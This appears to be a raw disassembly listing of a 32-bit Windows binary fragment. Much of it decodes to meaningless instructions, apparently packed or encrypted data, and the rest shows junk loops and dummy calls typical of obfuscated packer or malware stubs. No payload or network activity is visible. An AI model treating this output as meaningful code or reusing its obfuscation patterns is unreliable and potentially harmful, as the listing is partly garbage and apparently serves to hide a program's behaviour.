  40483f:	test   BYTE PTR [eax-0x25350de8],al
  404845:	rcr    BYTE PTR [edx],cl
  404847:	push   esp
  404848:	repz pushf 
  40484a:	int3   
  40484b:	ins    DWORD PTR es:[edi],dx
  40484c:	and    edx,edi
  40484e:	int    0xce
  404850:	ror    BYTE PTR [edx],0x14
  404853:	sbb    bl,BYTE PTR ds:0x899a0cac
  404859:	xchg   esp,eax
  40485a:	adc    eax,0xfc254489
  40485f:	out    dx,eax
  404860:	pop    edi
  404861:	cmc    
  404862:	shr    DWORD PTR [ebx],0x1d
  404865:	jnp    0x4048bb
  404867:	pop    es
  404868:	sub    ch,cl
  40486a:	test   eax,0xb6191cfe
  40486f:	mov    esp,0xd1a5dd83
  404874:	jle    0x40486d
  404876:	cmp    ch,BYTE PTR [edx]
  404878:	mov    bl,BYTE PTR [esi+0xb]
  40487b:	(bad)  
  40487c:	lock cli 
  40487e:	in     eax,0x2f
  404880:	out    0xc3,al
  404882:	gs out dx,eax
  404884:	out    0xe8,al
  404886:	adc    al,BYTE PTR [ebx]
  404888:	push   eax
  404889:	adc    edx,ebx
  40488b:	mov    eax,0xda4e93d6
  404890:	push   edi
  404891:	adc    eax,0x25e1ec96
  404896:	jecxz  0x4048db
  404898:	les    esp,FWORD PTR [esi]
  40489a:	mov    esi,ebp
  40489c:	adc    edx,edx
  40489e:	test   BYTE PTR [esi],ah
  4048a0:	push   esp
  4048a1:	icebp  
  4048a2:	dec    ecx
  4048a3:	fist   DWORD PTR [ebx]
  4048a5:	push   esi
  4048a6:	push   edi
  4048a7:	mov    ebp,0xdd51da8e
  4048ac:	jb     0x404887
  4048ae:	push   ss
  4048af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048b0:	aad    0x37
  4048b2:	jae    0x40490f
  4048b4:	in     al,0x8d
  4048b6:	and    DWORD PTR [esi-0x49118804],esi
  4048bc:	les    esp,FWORD PTR [edi+0x6a]
  4048bf:	push   edx
  4048c0:	scas   eax,DWORD PTR es:[edi]
  4048c1:	pop    ds
  4048c2:	les    edx,FWORD PTR [ebp-0x34c346b4]
  4048c8:	push   0xeffc22e7
  4048cd:	dec    ecx
  4048ce:	adc    ah,cl
  4048d0:	dec    DWORD PTR [esi]
  4048d2:	aaa    
  4048d3:	ror    cl,1
  4048d5:	or     DWORD PTR [esi],esi
  4048d7:	les    ebx,FWORD PTR fs:[ebx+0x25e97407]
  4048de:	add    ebp,esp
  4048e0:	jp     0x404866
  4048e2:	mov    bl,0xc2
  4048e4:	data16 add al,BYTE PTR [edx+edx*4+0x71fdcd89]
  4048ec:	xchg   BYTE PTR [edx-0x6f2fe60a],cl
  4048f2:	imul   eax,DWORD PTR [ebp-0xc],0x5d
  4048f6:	add    dl,BYTE PTR ss:[edi-0x3f]
  4048fa:	into   
  4048fb:	mov    edi,0xf7e764e6
  404900:	ins    DWORD PTR es:[edi],dx
  404901:	in     eax,0xbc
  404903:	adc    al,0xcc
  404905:	sbb    DWORD PTR [edx],0xffffff89
  404908:	rcr    ch,0xfa
  40490b:	inc    edx
  40490c:	inc    ebp
  40490d:	sub    DWORD PTR [edi-0x2c],esp
  404910:	mov    al,0xec
  404912:	fcomp  DWORD PTR [ebp-0x40]
  404915:	mov    al,0xb
  404917:	cwde   
  404918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404919:	jp     0x40493d
  40491b:	xor    edi,DWORD PTR [edx+0x77]
  40491e:	scas   al,BYTE PTR es:[edi]
  40491f:	out    dx,eax
  404920:	fcom   QWORD PTR [ebp+0x738b04a]
  404926:	je     0x4048b3
  404928:	(bad)  
  40492a:	enter  0xd3d3,0xff
  40492e:	cmp    DWORD PTR [edi+0x73],0x49
  404932:	and    DWORD PTR [edi],esp
  404934:	push   edi
  404936:	imul   edx,DWORD PTR [edi-0x52],0x7a
  40493a:	test   al,0xfa
  40493c:	arpl   WORD PTR [ebp+0x7b08edea],cx
  404942:	add    ebx,DWORD PTR [ebp-0x7187831d]
  404948:	mov    ebx,0xeca170ba
  40494d:	cli    
  40494e:	enter  0x936d,0x92
  404952:	mov    dh,0x98
  404954:	dec    edx
  404955:	into   
  404956:	sub    ebx,DWORD PTR [esi+0x22]
  404959:	mov    eax,0xf28172b7
  40495e:	jle    0x4049b2
  404960:	call   0x5f19:0x91ce1a62
  404967:	pop    edx
  404968:	loopne 0x404935
  40496a:	sub    ecx,eax
  40496c:	xchg   DWORD PTR [eax+0x50],ecx
  40496f:	popa   
  404970:	or     al,0x9d
  404972:	ror    DWORD PTR [eax+0x7e],1
  404975:	inc    edi
  404976:	inc    esp
  404977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404978:	inc    edx
  404979:	retf   0xe2ea
  40497c:	sub    BYTE PTR [esi],dl
  40497e:	ja     0x404969
  404980:	jmp    0x4049dc
  404982:	jle    0x40495a
  404984:	stc    
  404985:	mov    ds:0xb0f447d2,al
  40498a:	or     DWORD PTR [ebp+0x7c996d49],ecx
  404990:	ret    0x68c
  404993:	das    
  404994:	test   ebx,ebp
  404996:	inc    DWORD PTR [esi+0x20]
  404999:	sti    
  40499a:	outs   dx,BYTE PTR ds:[esi]
  40499b:	dec    ebp
  40499c:	push   edi
  40499d:	rcr    dh,cl
  40499f:	ins    BYTE PTR es:[edi],dx
  4049a0:	js     0x4049f6
  4049a2:	fisttp QWORD PTR ds:0xc45eb395
  4049a8:	inc    esi
  4049a9:	mov    bh,0x6f
  4049ab:	inc    ebp
  4049ac:	ins    BYTE PTR es:[edi],dx
  4049ad:	pop    es
  4049ae:	jne    0x40495b
  4049b0:	mov    al,0xf9
  4049b2:	mov    ds:0x28757c59,al
  4049b7:	push   ds
  4049b8:	push   0x7f
  4049ba:	sub    ebp,DWORD PTR [ecx]
  4049bc:	mov    ebx,0x65642792
  4049c1:	adc    BYTE PTR [eax+ebx*8+0x67],bl
  4049c5:	jbe    0x4049b3
  4049c7:	mov    esi,0x10b276ba
  4049cc:	lds    esp,FWORD PTR [edi+0x2f6a0043]
  4049d2:	cli    
  4049d3:	jl     0x404a38
  4049d5:	fs test ebx,esp
  4049d8:	sahf   
  4049d9:	xor    al,0x7d
  4049db:	and    BYTE PTR [ebx],0xe
  4049de:	jl     0x404a3d
  4049e0:	push   ecx
  4049e1:	push   eax
  4049e2:	out    dx,al
  4049e3:	jne    0x404a01
  4049e5:	adc    ebp,DWORD PTR [edi-0xe499cff]
  4049eb:	icebp  
  4049ec:	arpl   WORD PTR [ecx],dx
  4049ee:	pop    edx
  4049ef:	mov    eax,0x5451c40b
  4049f4:	dec    edi
  4049f5:	sub    bh,bh
  4049f7:	mov    ebx,0x8ccabb9c
  4049fc:	add    dh,BYTE PTR [edi+0x4]
  4049ff:	push   cs
  404a00:	bound  edi,QWORD PTR [ebp-0x5790a729]
  404a06:	sbb    DWORD PTR [ebp-0x444b5368],0xa594fc1f
  404a10:	sub    al,0xec
  404a12:	aaa    
  404a13:	sub    al,0xf4
  404a15:	lea    ecx,[esi]
  404a17:	adc    DWORD PTR [ebx],esi
  404a19:	inc    edi
  404a1a:	sbb    dh,bl
  404a1c:	dec    eax
  404a1d:	mov    ds:0xd16e7747,eax
  404a22:	rcr    DWORD PTR [esi],cl
  404a24:	sbb    ecx,DWORD PTR [ecx+ebp*2+0x2e]
  404a28:	popf   
  404a29:	jo     0x4049ea
  404a2b:	or     BYTE PTR [ebp-0x317fa45],0x14
  404a32:	mov    ?,WORD PTR [ebx+0x3a42e28]
  404a38:	mov    esp,0x6bbd0ef
  404a3d:	push   0x79
  404a3f:	sbb    cl,bl
  404a41:	pop    ds
  404a42:	sub    dh,bh
  404a44:	gs cs sti 
  404a47:	clc    
  404a48:	jo     0x404aa9
  404a4a:	test   BYTE PTR [ecx],dl
  404a4c:	dec    edx
  404a4d:	das    
  404a4e:	icebp  
  404a4f:	mov    ch,0x61
  404a51:	mov    ecx,0xc16b3e55
  404a56:	xchg   esp,eax
  404a57:	int3   
  404a58:	push   edx
  404a59:	mov    esi,0x8b2d63f
  404a5e:	mov    dh,0x3c
  404a60:	int3   
  404a61:	stc    
  404a62:	pushf  
  404a63:	inc    ebx
  404a64:	out    0x3c,eax
  404a66:	jecxz  0x404aa3
  404a68:	mov    ch,BYTE PTR ds:0x3d9048c9
  404a6e:	mov    eax,0xc95b5e5f
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43373f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4336b7
  404a94:	and    DWORD PTR ds:0x433703,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43362b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43366b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43372b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4336c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4336c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4336c3,edi
  404adf:	cmp    DWORD PTR ds:0x4336c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4336c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4336c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4336c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4336c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x24c1b432]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	push   es
  404b3a:	(bad)  
  404b3b:	xchg   ebp,eax
  404b3c:	and    BYTE PTR [ecx-0x1b],0x7b
  404b40:	add    eax,0xfd19dc5e
  404b45:	jl     0x404b80
  404b47:	jne    0x404ae3
  404b49:	out    0x78,eax
  404b4b:	(bad)  
  404b4c:	mov    eax,0x5bb826ee
  404b51:	repnz pop ecx
  404b53:	add    DWORD PTR [ecx-0x46],ebx
  404b56:	push   ebx
  404b57:	stc    
  404b58:	shl    BYTE PTR [edx-0x3cd31128],cl
  404b5e:	pop    esp
  404b5f:	sub    BYTE PTR [ebx],ah
  404b61:	dec    ebp
  404b62:	push   ss
  404b63:	lahf   
  404b64:	test   BYTE PTR [edx+0x2adcb8dc],dl
  404b6a:	inc    edi
  404b6b:	lock out 0x80,eax
  404b6e:	xchg   esp,eax
  404b6f:	stos   DWORD PTR es:[edi],eax
  404b70:	shl    WORD PTR [edi+ebp*4-0x52],0xa9
  404b76:	cmp    DWORD PTR [eax],0x35
  404b79:	retf   0xc165
  404b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b7d:	retf   
  404b7e:	adc    ecx,esp
  404b80:	retf   
  404b81:	or     eax,0x7a5f7cb6
  404b86:	or     BYTE PTR [edx-0x45],ah
  404b89:	test   esp,0xf038d05a
  404b8f:	jnp    0x404b47
  404b91:	adc    eax,0x6bf35916
  404b96:	mov    dh,ah
  404b98:	cld    
  404b99:	adc    dh,ch
  404b9b:	mov    esi,0x978e6c0f
  404ba0:	pop    ds
  404ba1:	pop    edx
  404ba2:	xor    bh,ch
  404ba4:	jmp    0x404b47
  404ba6:	xchg   ebx,eax
  404ba7:	stos   BYTE PTR es:[edi],al
  404ba8:	fs push DWORD PTR ds:[edx+edx*4+0x68]
  404bae:	mov    al,0x61
  404bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb1:	retf   
  404bb2:	mov    al,ds:0x18bae100
  404bb7:	mov    cl,0xef
  404bb9:	ret    
  404bba:	jmp    0x404b75
  404bbc:	scas   eax,DWORD PTR es:[edi]
  404bbd:	fdivr  QWORD PTR [ecx+ebp*8+0x45]
  404bc1:	ss stc 
  404bc3:	dec    edi
  404bc4:	inc    edi
  404bc5:	call   0x92c3:0xef4b2d37
  404bcc:	popa   
  404bcd:	mov    bh,BYTE PTR [ebx+0x36]
  404bd0:	in     eax,dx
  404bd1:	jo     0x404bb1
  404bd3:	loope  0x404bce
  404bd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd6:	xchg   ebx,eax
  404bd7:	cmp    esp,DWORD PTR ds:0x88ea9587
  404bdd:	mov    dl,0x9e
  404bdf:	mov    eax,0xf18b556
  404be4:	mov    es,edi
  404be6:	pop    edx
  404be7:	cmc    
  404be8:	loope  0x404c18
  404bea:	push   eax
  404beb:	jno    0x404c06
  404bed:	push   edi
  404bee:	push   DWORD PTR [edx-0x2b497853]
  404bf4:	outs   dx,DWORD PTR ds:[esi]
  404bf5:	fisttp DWORD PTR [ecx-0x274b0d0d]
  404bfb:	pop    ds
  404bfc:	pop    ebx
  404bfd:	lods   al,BYTE PTR ds:[esi]
  404bfe:	out    dx,eax
  404bff:	js     0x404bd1
  404c01:	mov    edx,0xbae72e5e
  404c06:	mov    ds:0x8eee9748,eax
  404c0b:	out    dx,eax
  404c0c:	pop    ss
  404c0d:	inc    ebp
  404c0e:	push   0xffffffd0
  404c10:	push   eax
  404c11:	sub    eax,0xd78a7cfc
  404c16:	jno    0x404c82
  404c18:	push   edx
  404c19:	xrelease mov BYTE PTR [eax+0x79],cl
  404c1d:	inc    edi
  404c1e:	dec    ebx
  404c1f:	push   esi
  404c20:	xor    BYTE PTR [edx+0x1c],al
  404c23:	mov    esi,0xdb85bd16
  404c28:	leave  
  404c29:	out    dx,eax
  404c2a:	out    dx,al
  404c2b:	outs   dx,BYTE PTR ds:[esi]
  404c2c:	pop    ss
  404c2d:	in     eax,dx
  404c2e:	dec    DWORD PTR [eax]
  404c30:	imul   eax,DWORD PTR [esi],0x5b7dbb7d
  404c36:	or     ebp,ebp
  404c38:	inc    eax
  404c39:	xchg   edx,eax
  404c3a:	fwait
  404c3b:	jbe    0x404c03
  404c3d:	inc    ebp
  404c3e:	out    0x5e,eax
  404c40:	leave  
  404c41:	pop    esp
  404c42:	xchg   BYTE PTR [esi-0x2cdd49a],ah
  404c48:	xchg   DWORD PTR [ecx],esi
  404c4a:	loop   0x404c45
  404c4c:	or     BYTE PTR [eax],bl
  404c4e:	xchg   ebx,eax
  404c4f:	mov    bl,0xfd
  404c51:	mov    dl,0xba
  404c53:	sub    cl,BYTE PTR [edx-0x2160620c]
  404c59:	inc    esi
  404c5a:	nop
  404c5b:	mov    cl,0x8f
  404c5d:	inc    esp
  404c5e:	call   0xc33db4c0
  404c63:	pop    ebx
  404c64:	mov    ebp,0xdf9e62c3
  404c69:	xor    eax,0x8f6177bb
  404c6e:	stos   BYTE PTR es:[edi],al
  404c6f:	xor    al,0x13
  404c71:	ror    DWORD PTR [esi+0x7a],0xf
  404c75:	and    ch,bh
  404c77:	inc    edx
  404c78:	mov    edi,0x3e0eb44d
  404c7d:	pop    es
  404c7e:	outs   dx,DWORD PTR ds:[esi]
  404c7f:	sldt   esi
  404c82:	aad    0x98
  404c84:	pop    es
  404c85:	std    
  404c86:	mov    DWORD PTR [eax],edx
  404c88:	xchg   ax,ax
  404c8a:	sub    ecx,DWORD PTR [edi+0x2f]
  404c8d:	pop    es
  404c8e:	popa   
  404c8f:	idiv   ah
  404c91:	mov    edx,0xfa85f020
  404c96:	cmp    DWORD PTR [edx+0x36197da3],esi
  404c9c:	or     BYTE PTR [edi+0x7ff8bb8f],0xb2
  404ca3:	pop    ss
  404ca4:	dec    BYTE PTR [edi+0x17]
  404ca7:	lahf   
  404ca8:	rol    DWORD PTR cs:[esi],cl
  404cab:	fnstcw WORD PTR [ecx]
  404cad:	jg     0x404d2b
  404caf:	jne    0x404c61
  404cb1:	js     0x404c34
  404cb3:	jae    0x404c77
  404cb5:	xchg   ecx,eax
  404cb6:	push   ds
  404cb7:	cmp    dl,BYTE PTR [esi-0x1d]
  404cba:	mov    dl,BYTE PTR [ebx-0x3a]
  404cbd:	mov    al,0x32
  404cbf:	add    ah,BYTE PTR [edi]
  404cc1:	ret    0x5ac6
  404cc4:	shl    DWORD PTR [edi],cl
  404cc6:	jo     0x404ccc
  404cc8:	ins    BYTE PTR es:[edi],dx
  404cc9:	inc    ecx
  404cca:	jge    0x404c8b
  404ccc:	mov    al,ds:0xe752c736
  404cd1:	test   BYTE PTR [ebx],bh
  404cd3:	mov    edx,ecx
  404cd5:	add    eax,0x47c5ac40
  404cda:	pop    esi
  404cdb:	and    al,0x65
  404cdd:	test   eax,0x527369ed
  404ce2:	xor    DWORD PTR [ebp+eiz*1-0x66],edi
  404ce6:	mov    dh,0x68
  404ce8:	aam    0x85
  404cea:	xchg   DWORD PTR [eax-0x24],edx
  404ced:	ins    BYTE PTR es:[edi],dx
  404cee:	or     al,0xc7
  404cf0:	aad    0xf4
  404cf2:	jne    0x404cfd
  404cf4:	cmp    BYTE PTR [ebp+0x75ec31c2],dh
  404cfa:	fs inc esi
  404cfc:	and    eax,0x927a7f13
  404d01:	test   al,0x7b
  404d03:	fnsave [ebp+eiz*8+0x53]
  404d07:	aam    0xac
  404d09:	(bad)  
  404d0a:	je     0x404c8d
  404d0c:	lds    esp,FWORD PTR [ecx-0x6a]
  404d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d10:	push   esp
  404d11:	pop    ss
  404d12:	add    eax,0x73a0e51b
  404d17:	pop    edx
  404d18:	dec    edi
  404d19:	ror    cl,1
  404d1b:	mov    ch,0x7d
  404d1d:	or     BYTE PTR [eax+0x4e],0x81
  404d21:	or     eax,0x8d9e3a8
  404d26:	hlt    
  404d27:	pop    ecx
  404d28:	cmc    
  404d29:	jno    0x404d17
  404d2b:	xchg   ch,bl
  404d2d:	rol    ch,cl
  404d2f:	frstor [esi-0x7ed332f5]
  404d35:	pop    ebx
  404d36:	and    BYTE PTR [esp+eax*1-0x7],dl
  404d3a:	(bad)  
  404d3b:	cmp    ecx,DWORD PTR [eax]
  404d3d:	lds    esi,FWORD PTR [eax+eax*2+0x5cfed244]
  404d44:	mov    ecx,0x967f9516
  404d49:	push   eax
  404d4a:	or     DWORD PTR [eax],ebp
  404d4c:	out    0x28,eax
  404d4e:	frstor [edi]
  404d50:	pop    eax
  404d51:	aam    0xe8
  404d53:	adc    ecx,esp
  404d55:	das    
  404d56:	cld    
  404d57:	in     al,dx
  404d58:	ja     0x404d7d
  404d5a:	push   ebp
  404d5b:	mov    esi,0xfa92d0d6
  404d60:	and    dh,al
  404d62:	dec    ecx
  404d63:	xor    BYTE PTR [ebp+0x60e2fc03],ch
  404d69:	addr16 call 0xeb6aca3b
  404d6f:	sub    eax,0xa02d68da
  404d74:	sbb    BYTE PTR [esi-0x26],dl
  404d77:	cmp    DWORD PTR [esi+ecx*2],0x12
  404d7b:	inc    esi
  404d7c:	xchg   esp,eax
  404d7d:	xlat   BYTE PTR ds:[ebx]
  404d7e:	pop    esi
  404d7f:	lock repz inc edx
  404d82:	mov    dl,0x80
  404d84:	mov    bh,0xec
  404d86:	jmp    0x404d1e
  404d88:	out    dx,al
  404d89:	(bad)  
  404d8a:	test   eax,0x106134a5
  404d8f:	mov    dh,0x1
  404d91:	adc    ebp,ecx
  404d93:	lahf   
  404d94:	ja     0x404d1c
  404d96:	jl     0x404d81
  404d98:	dec    esi
  404d99:	(bad)  
  404d9a:	out    0x9d,al
  404d9c:	xchg   ebx,eax
  404d9d:	arpl   WORD PTR [ebx+ecx*8+0x72],sp
  404da1:	and    edi,DWORD PTR [edx-0x4ac58549]
  404da7:	imul   ebx,ebx,0xf397a924
  404dad:	xchg   ebx,eax
  404dae:	jne    0x404d96
  404db0:	int    0xd1
  404db2:	add    al,0xd9
  404db5:	mov    eax,fs
  404db7:	push   edx
  404db8:	pop    ss
  404db9:	aaa    
  404dba:	jae    0x404d84
  404dbc:	lea    esi,[edx]
  404dbe:	jns    0x404d9a
  404dc0:	call   0x483e:0x4e3d8e43
  404dc7:	jbe    0x404d6d
  404dc9:	adc    BYTE PTR [eax-0x3d],al
  404dcc:	xor    BYTE PTR [eax-0x26],al
  404dcf:	adc    BYTE PTR [edi+eax*1],bl
  404dd2:	add    eax,0xdb02fa97
  404dd7:	mov    dl,0xb8
  404dd9:	ret    0x8a58
  404ddc:	ret    0x51a4
  404ddf:	sar    ebp,0x86
  404de2:	mov    dl,0x36
  404de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de5:	pop    edi
  404de6:	in     al,dx
  404de7:	push   eax
  404de8:	mov    DWORD PTR ds:0xe2b917c6,ebp
  404dee:	aad    0x13
  404df0:	inc    ebx
  404df1:	jl     0x404d7b
  404df3:	js     0x404e1f
  404df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df6:	mov    esi,0x4a44a6b3
  404dfb:	sbb    DWORD PTR [edx-0x23958fa9],0xa62cb8b5
  404e05:	fwait
  404e06:	jecxz  0x404da0
  404e08:	es adc al,0xaa
  404e0b:	dec    ebp
  404e0c:	push   cs
  404e0d:	inc    ebp
  404e0e:	pop    ecx
  404e0f:	fwait
  404e10:	push   es
  404e11:	lods   eax,DWORD PTR ds:[esi]
  404e12:	push   ebp
  404e13:	stos   DWORD PTR es:[edi],eax
  404e14:	and    BYTE PTR [ebx+eiz*8+0x1edb050a],bh
  404e1b:	inc    eax
  404e1c:	lock xor eax,0x9d85180c
  404e22:	adc    DWORD PTR [edx+esi*1-0x6ea90d21],esi
  404e29:	test   DWORD PTR [edx-0x35d8316b],edi
  404e2f:	xor    DWORD PTR [ecx-0x221fc954],esi
  404e35:	sar    DWORD PTR [ebx-0x80],1
  404e38:	jno    0x404e4a
  404e3a:	(bad)  
  404e3b:	loopne 0x404e9e
  404e3d:	fisub  DWORD PTR [edi-0x496c5f6]
  404e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e44:	loopne 0x404de3
  404e46:	adc    cl,cl
  404e48:	pop    es
  404e49:	or     dh,ah
  404e4b:	mov    WORD PTR [esi*2+0x70572339],cs
  404e52:	adc    al,dh
  404e54:	add    dl,BYTE PTR [ebx]
  404e56:	cli    
  404e57:	sub    ebx,DWORD PTR [eax-0x2fcaf0d7]
  404e5d:	and    bl,BYTE PTR [ebx]
  404e5f:	sbb    bl,BYTE PTR [esi]
  404e61:	int3   
  404e62:	jnp    0x404e6a
  404e64:	loopne 0x404e6c
  404e66:	push   cs
  404e67:	push   esi
  404e68:	es popf 
  404e6a:	add    eax,0x911f97a3
  404e6f:	lock aam 0x88
  404e72:	fsubr  DWORD PTR ds:0x558bd439
  404e78:	or     BYTE PTR [ecx+0x7359d1],al
  404e7e:	add    BYTE PTR [ecx+0x54b8c045],cl
  404e84:	or     BYTE PTR [ecx+0x7],dl
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43361b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4336e7
  404e9e:	adc    DWORD PTR ds:0x43367f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4336eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4336eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4336eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4336eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4336eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4336eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4336eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4336eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43373f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4336eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4336bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43373b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43373b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43373b,edi
  404f40:	cmp    DWORD PTR ds:0x43373b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43373b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43373b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43373b,edi
  404f72:	cmp    DWORD PTR ds:0x43373b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433637,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433667,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4336ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43360f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433667
  404fc8:	and    DWORD PTR ds:0x433613,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4336e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43372f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433737,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4336ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433627,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433627
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433627,edi
  405039:	cmp    DWORD PTR ds:0x433627,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433627,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433627
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433627,edi
  405079:	cmp    DWORD PTR ds:0x433627,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4336ff
  40508e:	add    DWORD PTR ds:0x4336bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4336eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43373b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43373b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4336fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433627,0x4336b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43361f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4336eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4336ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4336ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4336ff,edx
  40512b:	cmp    DWORD PTR ds:0x4336ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4336ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
